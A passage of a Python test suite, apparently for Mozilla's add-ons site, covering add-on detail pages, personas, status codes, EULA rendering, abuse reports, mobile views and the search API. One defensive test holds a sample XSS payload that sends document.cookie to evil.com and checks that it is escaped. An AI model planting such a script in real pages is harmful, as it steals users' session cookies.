    def test_other_addons_no_unlisted(self):
        """An unlisted add-on by the same author should not show up."""
        other = Addon.objects.get(id=592)
        other.update(status=amo.STATUS_UNREVIEWED, disabled_by_user=True)

        add_addon_author(other, self.addon)
        assert self.get_more_pq()('#author-addons').length == 0

    def test_other_addons_by_others(self):
        """Add-ons by different authors should not show up."""
        author = UserProfile.objects.get(pk=999)
        AddonUser.objects.create(addon=self.addon, user=author, listed=True)
        assert self.get_more_pq()('#author-addons').length == 0

    def test_other_addons_none(self):
        assert self.get_more_pq()('#author-addons').length == 0

    def test_categories(self):
        cat = self.addon.all_categories[0]
        cat.application = amo.THUNDERBIRD.id
        cat.save()
        links = self.get_more_pq()('#related ul:first').find('a')
        expected = [(unicode(c.name), c.get_url_path())
                    for c in self.addon.categories.filter(
                        application=amo.FIREFOX.id)]
        amo.tests.check_links(expected, links)


class TestPersonas(object):
    fixtures = ['addons/persona', 'base/users']

    def create_addon_user(self, addon):
        return AddonUser.objects.create(addon=addon, user_id=999)


class TestPersonaDetailPage(TestPersonas, TestCase):

    def setUp(self):
        super(TestPersonas, self).setUp()
        self.addon = Addon.objects.get(id=15663)
        self.persona = self.addon.persona
        self.url = self.addon.get_url_path()
        self.create_addon_user(self.addon)

    def test_persona_images(self):
        r = self.client.get(self.url)
        doc = pq(r.content)
        assert doc('h2.addon img').attr('src') == self.persona.icon_url
        style = doc('#persona div[data-browsertheme]').attr('style')
        assert self.persona.preview_url in style, (
            'style attribute %s does not link to %s' % (
                style, self.persona.preview_url))

    def test_more_personas(self):
        other = addon_factory(type=amo.ADDON_PERSONA)
        self.create_addon_user(other)
        r = self.client.get(self.url)
        assert pq(r.content)('#more-artist .more-link').length == 1

    def test_not_personas(self):
        other = addon_factory(type=amo.ADDON_EXTENSION)
        self.create_addon_user(other)
        r = self.client.get(self.url)
        assert pq(r.content)('#more-artist .more-link').length == 0

    def test_new_more_personas(self):
        other = addon_factory(type=amo.ADDON_PERSONA)
        self.create_addon_user(other)
        self.persona.persona_id = 0
        self.persona.save()
        r = self.client.get(self.url)
        profile = UserProfile.objects.get(id=999).get_url_path()
        assert pq(r.content)('#more-artist .more-link').attr('href') == (
            profile + '?src=addon-detail')

    def test_other_personas(self):
        """Ensure listed personas by the same author show up."""
        addon_factory(type=amo.ADDON_PERSONA, status=amo.STATUS_NULL)
        addon_factory(type=amo.ADDON_PERSONA, status=amo.STATUS_LITE)
        addon_factory(type=amo.ADDON_PERSONA, disabled_by_user=True)

        other = addon_factory(type=amo.ADDON_PERSONA)
        self.create_addon_user(other)
        assert other.status == amo.STATUS_PUBLIC
        assert not other.disabled_by_user

        # TODO(cvan): Uncomment this once Personas detail page is impalacized.
        # doc = self.get_more_pq()('#author-addons')
        # _test_hovercards(self, doc, [other], src='dp-dl-othersby')

        r = self.client.get(self.url)
        assert list(r.context['author_personas']) == [other]
        a = pq(r.content)('#more-artist .persona.hovercard a')
        assert a.length == 1
        assert a.attr('href') == other.get_url_path()

    def _test_by(self):
        """Test that the by... bit works."""
        r = self.client.get(self.url)
        assert pq(r.content)('h4.author').text().startswith('by regularuser')

    def test_by(self):
        self._test_by()

    @amo.tests.mobile_test
    def test_mobile_by(self):
        self._test_by()


class TestStatus(TestCase):
    fixtures = ['base/addon_3615', 'addons/persona']

    def setUp(self):
        super(TestStatus, self).setUp()
        self.addon = Addon.objects.get(id=3615)
        self.version = self.addon.current_version
        self.file = self.version.all_files[0]
        assert self.addon.status == amo.STATUS_PUBLIC
        self.url = self.addon.get_url_path()

        self.persona = Addon.objects.get(id=15663)
        assert self.persona.status == amo.STATUS_PUBLIC
        self.persona_url = self.persona.get_url_path()

    def test_incomplete(self):
        self.addon.update(status=amo.STATUS_NULL)
        assert self.client.get(self.url).status_code == 404

    def test_unreviewed(self):
        self.addon.update(status=amo.STATUS_UNREVIEWED)
        assert self.client.get(self.url).status_code == 200

    def test_pending(self):
        self.addon.update(status=amo.STATUS_PENDING)
        assert self.client.get(self.url).status_code == 404

    def test_nominated(self):
        self.addon.update(status=amo.STATUS_NOMINATED)
        assert self.client.get(self.url).status_code == 200

    def test_public(self):
        self.addon.update(status=amo.STATUS_PUBLIC)
        assert self.client.get(self.url).status_code == 200

    def test_deleted(self):
        self.addon.update(status=amo.STATUS_DELETED)
        assert self.client.get(self.url).status_code == 404

    def test_disabled(self):
        self.addon.update(status=amo.STATUS_DISABLED)
        assert self.client.get(self.url).status_code == 404

    def test_lite(self):
        self.addon.update(status=amo.STATUS_LITE)
        assert self.client.get(self.url).status_code == 200

    def test_lite_and_nominated(self):
        self.addon.update(status=amo.STATUS_LITE_AND_NOMINATED)
        assert self.client.get(self.url).status_code == 200

    def test_disabled_by_user(self):
        self.addon.update(disabled_by_user=True)
        assert self.client.get(self.url).status_code == 404

    def test_persona(self):
        for status in Persona.STATUS_CHOICES.keys():
            if status == amo.STATUS_DELETED:
                continue
            self.persona.status = status
            self.persona.save()
            assert self.client.head(self.persona_url).status_code == (
                200 if status in [amo.STATUS_PUBLIC, amo.STATUS_PENDING]
                else 404)

    def test_persona_disabled(self):
        for status in Persona.STATUS_CHOICES.keys():
            if status == amo.STATUS_DELETED:
                continue
            self.persona.status = status
            self.persona.disabled_by_user = True
            self.persona.save()
            assert self.client.head(self.persona_url).status_code == 404


class TestTagsBox(TestCase):
    fixtures = ['base/addontag']

    def test_tag_box(self):
        """Verify that we don't show duplicate tags."""
        r = self.client.get_ajax(reverse('addons.detail_more', args=[8680]),
                                 follow=True)
        doc = pq(r.content)
        assert 'SEO' == doc('#tagbox ul').children().text()


class TestEulaPolicyRedirects(TestCase):

    def test_eula_legacy_url(self):
        """
        See that we get a 301 to the zamboni style URL
        """
        response = self.client.get('/en-US/firefox/addons/policy/0/592/42')
        assert response.status_code == 301
        assert (response['Location'].find('/addon/592/eula/42') != -1)

    def test_policy_legacy_url(self):
        """
        See that we get a 301 to the zamboni style URL
        """
        response = self.client.get('/en-US/firefox/addons/policy/0/592/')
        assert response.status_code == 301
        assert (response['Location'].find('/addon/592/privacy/') != -1)


class TestEula(TestCase):
    fixtures = ['addons/eula+contrib-addon']

    def setUp(self):
        super(TestEula, self).setUp()
        self.addon = Addon.objects.get(id=11730)
        self.url = self.get_url()

    def get_url(self, args=[]):
        return reverse('addons.eula', args=[self.addon.slug] + args)

    def test_current_version(self):
        r = self.client.get(self.url)
        assert r.context['version'] == self.addon.current_version

    def test_simple_html_is_rendered(self):
        self.addon.eula = """
            <strong> what the hell..</strong>
            <ul>
                <li>papparapara</li>
                <li>todotodotodo</li>
            </ul>
            <ol>
                <a href="irc://irc.mozilla.org/firefox">firefox</a>

                Introduce yourself to the community, if you like!
                This text will appear publicly on your user info page.
                <li>papparapara2</li>
                <li>todotodotodo2</li>
            </ol>
            """
        self.addon.save()

        r = self.client.get(self.url)
        doc = pq(r.content)

        assert norm(doc('.policy-statement strong')) == (
            '<strong> what the hell..</strong>')
        assert norm(doc('.policy-statement ul')) == (
            '<ul><li>papparapara</li><li>todotodotodo</li></ul>')
        assert doc('.policy-statement ol a').text() == 'firefox'
        assert norm(doc('.policy-statement ol li:first')) == (
            '<li>papparapara2</li>')

    def test_evil_html_is_not_rendered(self):
        self.addon.eula = """
            <script type="text/javascript">
                window.location = 'http://evil.com/?c=' + document.cookie;
            </script>
            Muhuhahahahahahaha!
            """
        self.addon.save()

        r = self.client.get(self.url)
        doc = pq(r.content)

        policy = str(doc('.policy-statement'))
        assert policy.startswith('<div class="policy-statement">&lt;script'), (
            'Unexpected: %s' % policy[:50])

    def test_old_version(self):
        old = self.addon.versions.order_by('created')[0]
        assert old != self.addon.current_version
        r = self.client.get(self.get_url([old.all_files[0].id]))
        assert r.context['version'] == old

    def test_redirect_no_eula(self):
        self.addon.update(eula=None)
        r = self.client.get(self.url, follow=True)
        self.assert3xx(r, self.addon.get_url_path())

    def test_cat_sidebar(self):
        check_cat_sidebar(self.url, self.addon)


class TestXssOnName(amo.tests.TestXss):

    def test_eula_page(self):
        url = reverse('addons.eula', args=[self.addon.slug])
        self.assertNameAndNoXSS(url)

    def test_detail_page(self):
        url = reverse('addons.detail', args=[self.addon.slug])
        self.assertNameAndNoXSS(url)

    def test_meet_page(self):
        url = reverse('addons.meet', args=[self.addon.slug])
        self.assertNameAndNoXSS(url)

    def test_privacy_page(self):
        url = reverse('addons.privacy', args=[self.addon.slug])
        self.assertNameAndNoXSS(url)

    def test_reviews_list(self):
        url = reverse('addons.reviews.list', args=[self.addon.slug])
        self.assertNameAndNoXSS(url)

    def test_reviews_add(self):
        url = reverse('addons.reviews.add', args=[self.addon.slug])
        self.client.login(username='fligtar@gmail.com', password='foo')
        self.assertNameAndNoXSS(url)


class TestPrivacyPolicy(TestCase):
    fixtures = ['addons/eula+contrib-addon']

    def setUp(self):
        super(TestPrivacyPolicy, self).setUp()
        self.addon = Addon.objects.get(id=11730)
        self.url = reverse('addons.privacy', args=[self.addon.slug])

    def test_redirect_no_eula(self):
        assert self.addon.privacy_policy is None
        r = self.client.get(self.url, follow=True)
        self.assert3xx(r, self.addon.get_url_path())

    def test_cat_sidebar(self):
        self.addon.privacy_policy = 'shizzle'
        self.addon.save()
        check_cat_sidebar(self.url, self.addon)


@patch.object(settings, 'NOBOT_RECAPTCHA_PRIVATE_KEY', 'something')
class TestReportAbuse(TestCase):
    fixtures = ['addons/persona', 'base/addon_3615', 'base/users']

    def setUp(self):
        super(TestReportAbuse, self).setUp()
        self.full_page = reverse('addons.abuse', args=['a3615'])

    @patch('olympia.amo.fields.ReCaptchaField.clean')
    def test_abuse_anonymous(self, clean):
        clean.return_value = ""
        self.client.post(self.full_page, {'text': 'spammy'})
        assert len(mail.outbox) == 1
        assert 'spammy' in mail.outbox[0].body
        report = AbuseReport.objects.get(addon=3615)
        assert report.message == 'spammy'
        assert report.reporter is None

    def test_abuse_anonymous_fails(self):
        r = self.client.post(self.full_page, {'text': 'spammy'})
        assert 'recaptcha' in r.context['abuse_form'].errors

    def test_abuse_logged_in(self):
        self.client.login(username='regular@mozilla.com', password='password')
        self.client.post(self.full_page, {'text': 'spammy'})
        assert len(mail.outbox) == 1
        assert 'spammy' in mail.outbox[0].body
        report = AbuseReport.objects.get(addon=3615)
        assert report.message == 'spammy'
        assert report.reporter.email == 'regular@mozilla.com'

    def test_abuse_name(self):
        addon = Addon.objects.get(pk=3615)
        addon.name = 'Bmrk.ru Социальные закладки'
        addon.save()

        self.client.login(username='regular@mozilla.com', password='password')
        self.client.post(self.full_page, {'text': 'spammy'})
        assert 'spammy' in mail.outbox[0].body
        assert AbuseReport.objects.get(addon=addon)

    def test_abuse_persona(self):
        shared_url = reverse('addons.detail', args=['a15663'])
        r = self.client.get(shared_url)
        doc = pq(r.content)
        assert doc("fieldset.abuse")

        # and now just test it works
        self.client.login(username='regular@mozilla.com', password='password')
        r = self.client.post(reverse('addons.abuse', args=['a15663']),
                             {'text': 'spammy'})
        self.assert3xx(r, shared_url)
        assert len(mail.outbox) == 1
        assert 'spammy' in mail.outbox[0].body
        assert AbuseReport.objects.get(addon=15663)


class TestMobile(amo.tests.MobileTest, TestCase):
    fixtures = ['addons/featured', 'base/users',
                'base/addon_3615', 'base/featured',
                'bandwagon/featured_collections']


class TestMobileHome(TestMobile):

    def test_addons(self):
        r = self.client.get('/', follow=True)
        assert r.status_code == 200
        app, lang = r.context['APP'], r.context['LANG']
        featured, popular = r.context['featured'], r.context['popular']
        # Careful here: we can't be sure of the number of featured addons,
        # that's why we're not testing len(featured). There's a corner case
        # when there's less than 3 featured addons: some of the 3 random
        # featured IDs could correspond to a Persona, and they're filtered out
        # in the mobilized version of addons.views.home.
        assert all(a.is_featured(app, lang) for a in featured)
        assert len(popular) == 3
        assert [a.id for a in popular] == (
            [a.id for a in sorted(popular, key=lambda x: x.average_daily_users,
                                  reverse=True)])


class TestMobileDetails(TestPersonas, TestMobile):
    fixtures = TestMobile.fixtures + ['base/featured', 'base/users']

    def setUp(self):
        super(TestMobileDetails, self).setUp()
        self.ext = Addon.objects.get(id=3615)
        self.url = reverse('addons.detail', args=[self.ext.slug])
        self.persona = Addon.objects.get(id=15679)
        self.persona_url = self.persona.get_url_path()
        self.create_addon_user(self.persona)

    def test_extension(self):
        r = self.client.get(self.url)
        assert r.status_code == 200
        self.assertTemplateUsed(r, 'addons/mobile/details.html')

    def test_persona(self):
        r = self.client.get(self.persona_url, follow=True)
        assert r.status_code == 200
        self.assertTemplateUsed(r, 'addons/mobile/persona_detail.html')
        assert 'review_form' not in r.context
        assert 'reviews' not in r.context
        assert 'get_replies' not in r.context

    def test_more_personas(self):
        other = addon_factory(type=amo.ADDON_PERSONA)
        self.create_addon_user(other)
        r = self.client.get(self.persona_url, follow=True)
        assert pq(r.content)('#more-artist .more-link').length == 1

    def test_new_more_personas(self):
        other = addon_factory(type=amo.ADDON_PERSONA)
        self.create_addon_user(other)
        self.persona.persona.persona_id = 0
        self.persona.persona.save()
        r = self.client.get(self.persona_url, follow=True)
        profile = UserProfile.objects.get(id=999).get_url_path()
        assert pq(r.content)('#more-artist .more-link').attr('href') == (
            profile + '?src=addon-detail')

    def test_persona_mobile_url(self):
        r = self.client.get('/en-US/mobile/addon/15679/')
        assert r.status_code == 200

    def test_extension_release_notes(self):
        r = self.client.get(self.url)
        relnotes = pq(r.content)('.versions li:first-child > a')
        assert relnotes.text().startswith(self.ext.current_version.version), (
            'Version number missing')
        version_url = self.ext.current_version.get_url_path()
        assert relnotes.attr('href') == version_url
        self.client.get(version_url, follow=True)
        assert r.status_code == 200

    def test_extension_adu(self):
        doc = pq(self.client.get(self.url).content)('table')
        assert doc('.adu td').text() == numberfmt(self.ext.average_daily_users)
        self.ext.update(average_daily_users=0)
        doc = pq(self.client.get(self.url).content)('table')
        assert doc('.adu').length == 0

    def test_extension_downloads(self):
        doc = pq(self.client.get(self.url).content)('table')
        assert doc('.downloads td').text() == numberfmt(
            self.ext.weekly_downloads)
        self.ext.update(weekly_downloads=0)
        doc = pq(self.client.get(self.url).content)('table')
        assert doc('.downloads').length == 0

    @patch.object(settings, 'CDN_HOST', 'https://cdn.example.com')
    def test_button_caching_and_cdn(self):
        """The button popups should be cached for a long time."""
        # Get the url from a real page so it includes the build id.
        client = test.Client()
        doc = pq(client.get('/', follow=True).content)
        js_url = '%s%s' % (settings.CDN_HOST, reverse('addons.buttons.js'))
        url_with_build = doc('script[src^="%s"]' % js_url).attr('src')

        response = client.get(url_with_build.replace(settings.CDN_HOST, ''),
                              follow=False)
        self.assertCloseToNow(response['Expires'],
                              now=datetime.now() + timedelta(days=365))

    def test_unicode_redirect(self):
        url = '/en-US/firefox/addon/2848?xx=\xc2\xbcwhscheck\xc2\xbe'
        response = test.Client().get(url)
        assert response.status_code == 301


class TestAddonViewSetDetail(TestCase):
    def setUp(self):
        super(TestAddonViewSetDetail, self).setUp()
        self.addon = addon_factory(
            guid=generate_addon_guid(), name=u'My Addôn', slug='my-addon')
        self.url = reverse('addon-detail', kwargs={'pk': self.addon.pk})

    def _test_detail_url(self):
        response = self.client.get(self.url)
        assert response.status_code == 200
        result = json.loads(response.content)
        assert result['id'] == self.addon.pk
        assert result['name'] == {'en-US': u'My Addôn'}
        assert result['slug'] == 'my-addon'
        assert result['last_updated'] == self.addon.last_updated.isoformat()

    def test_get_by_id(self):
        self._test_detail_url()

    def test_get_by_slug(self):
        self.url = reverse('addon-detail', kwargs={'pk': self.addon.slug})
        self._test_detail_url()

    def test_get_by_guid(self):
        self.url = reverse('addon-detail', kwargs={'pk': self.addon.guid})
        self._test_detail_url()

    def test_get_by_guid_uppercase(self):
        self.url = reverse('addon-detail',
                           kwargs={'pk': self.addon.guid.upper()})
        self._test_detail_url()

    def test_get_by_guid_email_format(self):
        self.addon.update(guid='my-addon@example.tld')
        self.url = reverse('addon-detail', kwargs={'pk': self.addon.guid})
        self._test_detail_url()

    def test_get_by_guid_email_short_format(self):
        self.addon.update(guid='@example.tld')
        self.url = reverse('addon-detail', kwargs={'pk': self.addon.guid})
        self._test_detail_url()

    def test_get_by_guid_email_really_short_format(self):
        self.addon.update(guid='@example')
        self.url = reverse('addon-detail', kwargs={'pk': self.addon.guid})
        self._test_detail_url()

    def test_get_lite_status(self):
        self.addon.update(status=amo.STATUS_LITE)
        self._test_detail_url()

    def test_get_lite_and_nominated_status(self):
        self.addon.update(status=amo.STATUS_LITE_AND_NOMINATED)
        self._test_detail_url()

    def test_get_not_public_anonymous(self):
        self.addon.update(status=amo.STATUS_UNREVIEWED)
        response = self.client.get(self.url)
        assert response.status_code == 401

    def test_get_not_public_no_rights(self):
        self.addon.update(status=amo.STATUS_UNREVIEWED)
        user = UserProfile.objects.create(username='simpleuser')
        self.client.login_api(user)
        response = self.client.get(self.url)
        assert response.status_code == 403

    def test_get_not_public_reviewer(self):
        self.addon.update(status=amo.STATUS_UNREVIEWED)
        user = UserProfile.objects.create(username='reviewer')
        self.grant_permission(user, 'Addons:Review')
        self.client.login_api(user)
        response = self.client.get(self.url)
        assert response.status_code == 200

    def test_get_not_public_author(self):
        self.addon.update(status=amo.STATUS_UNREVIEWED)
        user = UserProfile.objects.create(username='author')
        AddonUser.objects.create(user=user, addon=self.addon)
        self.client.login_api(user)
        response = self.client.get(self.url)
        assert response.status_code == 200

    def test_get_disabled_by_user_anonymous(self):
        self.addon.update(disabled_by_user=True)
        response = self.client.get(self.url)
        assert response.status_code == 401

    def test_get_not_listed(self):
        self.addon.update(is_listed=False)
        response = self.client.get(self.url)
        assert response.status_code == 401

    def test_get_not_listed_no_rights(self):
        user = UserProfile.objects.create(username='simpleuser')
        self.addon.update(is_listed=False)
        self.client.login_api(user)
        response = self.client.get(self.url)
        assert response.status_code == 403

    def test_get_not_listed_simple_reviewer(self):
        user = UserProfile.objects.create(username='reviewer')
        self.grant_permission(user, 'Addons:Review')
        self.addon.update(is_listed=False)
        self.client.login_api(user)
        response = self.client.get(self.url)
        assert response.status_code == 403

    def test_get_not_listed_specific_reviewer(self):
        user = UserProfile.objects.create(username='reviewer')
        self.grant_permission(user, 'Addons:ReviewUnlisted')
        self.addon.update(is_listed=False)
        self.client.login_api(user)
        response = self.client.get(self.url)
        assert response.status_code == 200

    def test_get_not_listed_author(self):
        user = UserProfile.objects.create(username='author')
        AddonUser.objects.create(user=user, addon=self.addon)
        self.addon.update(is_listed=False)
        self.client.login_api(user)
        response = self.client.get(self.url)
        assert response.status_code == 200

    def test_get_deleted(self):
        self.addon.delete()
        response = self.client.get(self.url)
        assert response.status_code == 404

    def test_get_deleted_no_rights(self):
        self.addon.delete()
        user = UserProfile.objects.create(username='simpleuser')
        self.client.login_api(user)
        response = self.client.get(self.url)
        assert response.status_code == 404

    def test_get_deleted_reviewer(self):
        user = UserProfile.objects.create(username='reviewer')
        self.grant_permission(user, 'Addons:Review')
        self.addon.delete()
        self.client.login_api(user)
        response = self.client.get(self.url)
        assert response.status_code == 404

    def test_get_deleted_admin(self):
        user = UserProfile.objects.create(username='admin')
        self.grant_permission(user, '*:*')
        self.addon.delete()
        self.client.login_api(user)
        response = self.client.get(self.url)
        assert response.status_code == 200

    def test_get_deleted_author(self):
        # Owners can't see their own add-on once deleted, only admins can.
        user = UserProfile.objects.create(username='author')
        AddonUser.objects.create(user=user, addon=self.addon)
        self.addon.delete()
        self.client.login_api(user)
        response = self.client.get(self.url)
        assert response.status_code == 404

    def test_get_not_found(self):
        self.url = reverse('addon-detail', kwargs={'pk': self.addon.pk + 42})
        response = self.client.get(self.url)
        assert response.status_code == 404


class TestAddonViewSetFeatureCompatibility(TestCase):
    def setUp(self):
        super(TestAddonViewSetFeatureCompatibility, self).setUp()
        self.addon = addon_factory(
            guid=generate_addon_guid(), name=u'My Addôn', slug='my-addon')
        self.url = reverse(
            'addon-feature-compatibility', kwargs={'pk': self.addon.pk})

    def test_url(self):
        self.detail_url = reverse('addon-detail', kwargs={'pk': self.addon.pk})
        assert self.url == '%s%s' % (self.detail_url, 'feature_compatibility/')

    def test_disabled_anonymous(self):
        self.addon.update(disabled_by_user=True)
        response = self.client.get(self.url)
        assert response.status_code == 401

    def test_feature_compatibility_unknown(self):
        response = self.client.get(self.url)
        assert response.status_code == 200
        data = json.loads(response.content)
        assert data['e10s'] == 'unknown'

    def test_feature_compatibility_compatible(self):
        AddonFeatureCompatibility.objects.create(
            addon=self.addon, e10s=amo.E10S_COMPATIBLE)
        response = self.client.get(self.url)
        assert response.status_code == 200
        data = json.loads(response.content)
        assert data['e10s'] == 'compatible'


class TestAddonSearchView(ESTestCase):
    fixtures = ['base/users']

    def setUp(self):
        super(TestAddonSearchView, self).setUp()
        self.url = reverse('addon-search')

    def tearDown(self):
        super(TestAddonSearchView, self).tearDown()
        self.empty_index('default')
        self.refresh()

    def perform_search(self, url, data=None, **headers):
        with self.assertNumQueries(0):
            response = self.client.get(url, data, **headers)
        assert response.status_code == 200
        data = json.loads(response.content)
        return data

    def test_basic(self):
        addon = addon_factory(slug='my-addon', name=u'My Addôn',
                              weekly_downloads=666)
        addon2 = addon_factory(slug='my-second-addon', name=u'My second Addôn',
                               weekly_downloads=555)
        self.refresh()

        data = self.perform_search(self.url)  # No query.
        assert data['count'] == 2
        assert len(data['results']) == 2

        result = data['results'][0]
        assert result['id'] == addon.pk
        assert result['name'] == {'en-US': u'My Addôn'}
        assert result['slug'] == 'my-addon'
        assert result['last_updated'] == addon.last_updated.isoformat()

        result = data['results'][1]
        assert result['id'] == addon2.pk
        assert result['name'] == {'en-US': u'My second Addôn'}
        assert result['slug'] == 'my-second-addon'

    def test_empty(self):
        data = self.perform_search(self.url)
        assert data['count'] == 0
        assert len(data['results']) == 0

    def test_pagination(self):
        addon = addon_factory(slug='my-addon', name=u'My Addôn',
                              weekly_downloads=33)
        addon2 = addon_factory(slug='my-second-addon', name=u'My second Addôn',
                               weekly_downloads=22)
        addon_factory(slug='my-third-addon', name=u'My third Addôn',
                      weekly_downloads=11)
        self.refresh()

        data = self.perform_search(self.url, {'page_size': 1})
        assert data['count'] == 3
        assert len(data['results']) == 1

        result = data['results'][0]
        assert result['id'] == addon.pk
        assert result['name'] == {'en-US': u'My Addôn'}
        assert result['slug'] == 'my-addon'

        # Search using the second page URL given in return value.
        data = self.perform_search(data['next'])
        assert data['count'] == 3
        assert len(data['results']) == 1

        result = data['results'][0]
        assert result['id'] == addon2.pk
        assert result['name'] == {'en-US': u'My second Addôn'}
        assert result['slug'] == 'my-second-addon'

    def test_pagination_sort_and_query(self):
        addon_factory(slug='my-addon', name=u'Cy Addôn')
        addon2 = addon_factory(slug='my-second-addon', name=u'By second Addôn')
        addon1 = addon_factory(slug='my-first-addon', name=u'Ay first Addôn')
        addon_factory(slug='only-happy-when-itrains', name=u'Garbage')
        self.refresh()

        data = self.perform_search(self.url, {
            'page_size': 1, 'q': u'addôn', 'sort': 'name'})
        assert data['count'] == 3
        assert len(data['results']) == 1

        result = data['results'][0]
        assert result['id'] == addon1.pk
        assert result['name'] == {'en-US': u'Ay first Addôn'}

        # Search using the second page URL given in return value.
        assert 'sort=name' in data['next']
        data = self.perform_search(data['next'])
        assert data['count'] == 3
        assert len(data['results']) == 1
        assert 'sort=name' in data['previous']

        result = data['results'][0]
        assert result['id'] == addon2.pk
        assert result['name'] == {'en-US': u'By second Addôn'}

    def test_filtering_only_reviewed_addons(self):
        public_addon = addon_factory(slug='my-addon', name=u'My Addôn',
                                     weekly_downloads=222)
        addon_factory(slug='my-incomplete-addon', name=u'My incomplete Addôn',
                      status=amo.STATUS_NULL)
        addon_factory(slug='my-unreviewed-addon', name=u'My unreviewed Addôn',
                      status=amo.STATUS_UNREVIEWED)
        lite_addon = addon_factory(slug='my-lite-addon',
                                   name=u'My Preliminarily Reviewed Addôn',
                                   status=amo.STATUS_LITE,
                                   weekly_downloads=22)
        addon_factory(slug='my-disabled-addon', name=u'My disabled Addôn',
                      status=amo.STATUS_DISABLED)
        addon_factory(slug='my-unlisted-addon', name=u'My unlisted Addôn',
                      is_listed=False)
        lite_and_nominated_addon = addon_factory(
            slug='my-lite-and-nominated-addon',
            name=u'My Preliminary Reviewed and Awaiting Full Review Addôn',
            status=amo.STATUS_LITE_AND_NOMINATED,
            weekly_downloads=2)
        addon_factory(slug='my-disabled-by-user-addon',
                      name=u'My disabled by user Addôn',
                      disabled_by_user=True)
        self.refresh()

        data = self.perform_search(self.url)
        assert data['count'] == 3
        assert len(data['results']) == 3

        result = data['results'][0]
        assert result['id'] == public_addon.pk
        assert result['name'] == {'en-US': u'My Addôn'}
        assert result['slug'] == 'my-addon'

        result = data['results'][1]
        assert result['id'] == lite_addon.pk
        assert result['name'] == {'en-US': u'My Preliminarily Reviewed Addôn'}
        assert result['slug'] == 'my-lite-addon'

        result = data['results'][2]
        assert result['id'] == lite_and_nominated_addon.pk
        assert result['name'] == {
            'en-US': u'My Preliminary Reviewed and Awaiting Full Review Addôn'}
        assert result['slug'] == 'my-lite-and-nominated-addon'

    def test_with_query(self):
        addon = addon_factory(slug='my-addon', name=u'My Addôn',
                              tags=['some_tag'])
        addon_factory(slug='unrelated', name=u'Unrelated')
        self.refresh()

        data = self.perform_search(self.url, {'q': 'addon'})
        assert data['count'] == 1
        assert len(data['results']) == 1

        result = data['results'][0]
        assert result['id'] == addon.pk
        assert result['name'] == {'en-US': u'My Addôn'}
        assert result['slug'] == 'my-addon'

    def test_with_session_cookie(self):
        # Session cookie should be ignored, therefore a request with it should
        # not cause more database queries.
        self.client.login(username='regular@mozilla.com', password='password')
        data = self.perform_search(self.url)
        assert data['count'] == 0
        assert len(data['results']) == 0

    def test_filter_by_type(self):
        addon = addon_factory(slug='my-addon', name=u'My Addôn')
        theme = addon_factory(slug='my-theme', name=u'My Thème',
                              type=amo.ADDON_THEME)
        self.refresh()

        data = self.perform_search(self.url, {'type': 'extension'})
        assert data['count'] == 1
        assert len(data['results']) == 1
        assert data['results'][0]['id'] == addon.pk

        data = self.perform_search(self.url, {'type': 'theme'})
        assert data['count'] == 1
        assert len(data['results']) == 1
        assert data['results'][0]['id'] == theme.pk

    def test_filter_by_platform(self):
        # First add-on is available for all platforms.
        addon = addon_factory(slug='my-addon', name=u'My Addôn',
                              weekly_downloads=33)
        addon_factory(
            slug='my-linux-addon', name=u'My linux-only Addön',
            file_kw={'platform': amo.PLATFORM_LINUX.id},
            weekly_downloads=22)
        mac_addon = addon_factory(
            slug='my-mac-addon', name=u'My mac-only Addön',
            file_kw={'platform': amo.PLATFORM_MAC.id},
            weekly_downloads=11)
        self.refresh()

        data = self.perform_search(self.url)
        assert data['count'] == 3
        assert len(data['results']) == 3
        assert data['results'][0]['id'] == addon.pk

        data = self.perform_search(self.url, {'platform': 'mac'})
        assert data['count'] == 2
        assert len(data['results']) == 2
        assert data['results'][0]['id'] == addon.pk
        assert data['results'][1]['id'] == mac_addon.pk

    def test_filter_by_app(self):
        addon = addon_factory(
            slug='my-addon', name=u'My Addôn', weekly_downloads=33,
            version_kw={'min_app_version': '42.0',
                        'max_app_version': '*'})
        tb_addon = addon_factory(
            slug='my-tb-addon', name=u'My TBV Addøn', weekly_downloads=22,
            version_kw={'application': amo.THUNDERBIRD.id,
                        'min_app_version': '42.0',
                        'max_app_version': '*'})
        both_addon = addon_factory(
            slug='my-both-addon', name=u'My Both Addøn', weekly_downloads=11,
            version_kw={'min_app_version': '43.0',
                        'max_app_version': '*'})
        # both_addon was created with firefox compatibility, manually add
        # thunderbird, making it compatible with both.
        ApplicationsVersions.objects.create(
            application=amo.THUNDERBIRD.id, version=both_addon.current_version,
            min=AppVersion.objects.create(
                application=amo.THUNDERBIRD.id, version='43.0'),
            max=AppVersion.objects.get(
                application=amo.THUNDERBIRD.id, version='*'))
        # Because the manually created ApplicationsVersions was created after
        # the initial save, we need to reindex and not just refresh.
        self.reindex(Addon)

        data = self.perform_search(self.url, {'app': 'firefox'})
        assert data['count'] == 2
        assert len(data['results']) == 2
        assert data['results'][0]['id'] == addon.pk
        assert data['results'][1]['id'] == both_addon.pk

        data = self.perform_search(self.url, {'app': 'thunderbird'})
        assert data['count'] == 2
        assert len(data['results']) == 2
        assert data['results'][0]['id'] == tb_addon.pk
        assert data['results'][1]['id'] == both_addon.pk

    def test_filter_by_appversion(self):
        addon = addon_factory(
            slug='my-addon', name=u'My Addôn', weekly_downloads=33,
            version_kw={'min_app_version': '42.0',
                        'max_app_version': '*'})
        tb_addon = addon_factory(
            slug='my-tb-addon', name=u'My TBV Addøn', weekly_downloads=22,
            version_kw={'application': amo.THUNDERBIRD.id,
                        'min_app_version': '42.0',
                        'max_app_version': '*'})
        both_addon = addon_factory(
            slug='my-both-addon', name=u'My Both Addøn', weekly_downloads=11,
            version_kw={'min_app_version': '43.0',
                        'max_app_version': '*'})
        # both_addon was created with firefox compatibility, manually add
        # thunderbird, making it compatible with both.
        ApplicationsVersions.objects.create(
            application=amo.THUNDERBIRD.id, version=both_addon.current_version,
            min=AppVersion.objects.create(
                application=amo.THUNDERBIRD.id, version='43.0'),
            max=AppVersion.objects.get(
                application=amo.THUNDERBIRD.id, version='*'))
        # Because the manually created ApplicationsVersions was created after
        # the initial save, we need to reindex and not just refresh.
        self.reindex(Addon)

        data = self.perform_search(self.url, {'app': 'firefox',
                                              'appversion': '46.0'})
        assert data['count'] == 2
        assert len(data['results']) == 2
        assert data['results'][0]['id'] == addon.pk
        assert data['results'][1]['id'] == both_addon.pk

        data = self.perform_search(self.url, {'app': 'thunderbird',
                                              'appversion': '43.0.1'})
        assert data['count'] == 2
        assert len(data['results']) == 2
        assert data['results'][0]['id'] == tb_addon.pk
        assert data['results'][1]['id'] == both_addon.pk

        data = self.perform_search(self.url, {'app': 'firefox',
                                              'appversion': '42.0'})
        assert data['count'] == 1
        assert len(data['results']) == 1
